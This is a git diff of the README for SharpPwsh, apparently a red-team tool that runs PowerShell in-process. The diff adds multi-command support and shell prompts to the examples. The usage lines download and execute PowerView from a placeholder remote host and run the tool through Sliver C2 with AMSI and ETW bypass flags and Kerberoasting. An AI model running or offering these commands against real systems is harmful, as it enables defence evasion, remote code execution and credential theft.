@@ -5,6 +5,7 @@ C# .Net Framework program that uses `RunspaceFactory` for Powershell command exe
 - Execute Powershell commands
 - Load & execute remote script
 - AMSI Bypass
+- Multiple command support
 
 ## Usage
 
@@ -27,10 +28,13 @@ Copyright c  2022
 
 ```
 # execute powershell command
-.\SharpPwsh.exe -c whoami
+PS > .\SharpPwsh.exe -c whoami
 
 # load remote script and execute
-.\SharpPwsh.exe -u http://x.x.x.x/PowerView.ps1 -c get-netlocalgroup
+PS > .\SharpPwsh.exe -u http://x.x.x.x/PowerView.ps1 -c get-netlocalgroup
+
+# execute multiple powershell commands
+PS > .\SharpPwsh.exe -c hostname,whoami
 
 # sliver inline & bypass AMSI + ETW
 sliver > execute-assembly -M -E -i /tools/SharpPwsh.exe -c get-netlocalgroup -u http://x.x.x.x/psh/PowerSploit/Recon/PowerView.ps1
@@ -44,7 +48,7 @@ sliver > inline-execute-assembly /tools/SharpPwsh.exe '-b -c invoke-kerberoast -
 - Load & execute script from disk
 - Load & execute script from clipboard
 - Compression & encryption support for scripts
-- Multiple command support
+
 
 ## Build
 Built using .NET Framework v4.5.1 in Visual Studio 2019.
